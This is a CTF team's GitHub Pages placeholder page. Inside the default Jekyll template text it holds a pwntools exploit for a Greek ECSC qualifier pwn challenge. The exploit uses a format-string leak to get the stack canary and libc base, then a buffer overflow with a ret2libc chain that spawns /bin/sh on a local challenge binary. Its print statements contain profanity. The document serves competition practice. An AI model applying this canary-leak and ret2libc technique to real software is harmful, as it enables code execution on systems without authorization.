## Welcome to Fuzzer's Palace

You can use the [editor on GitHub](https://github.com/Fuzz3rCTF/Fuzz3rCTF.github.io/edit/master/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Greek ECSC QUALS-Pwn Challenge
```python
from pwn import *

def pwn():
        sys_off = 0x03ada0
        exit_off = 0x02e9d0
        bin_sh_off = 0x15ba0b
        p = lambda x : (x[2:].decode('hex'))[::-1]
        r = process('./bof6')
        r.recvuntil('Name: ')
        r.sendline('%x '*18)
        a = r.recvuntil(':')
        print a
        canary = hex(int(a[57:65], 16))
        libc=int(a[95:103],16)-1777664
        print "[+] Here is your cookie motherfucker: "+str(canary)
        print "[+] Libc base address SKIDO: "+hex(libc)
        payload = ""
        payload += "A"*64
        payload += p(canary)
        payload += "B"*12
        payload += p(hex(libc+sys_off))
        payload += p(hex(libc+exit_off))
        payload += p(hex(libc+bin_sh_off))
        r.sendline(payload)
        r.interactive()

pwn()
```

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Fuzz3rCTF/Fuzz3rCTF.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

[Twitter](https://www.twitter.com/proud_skid/) 
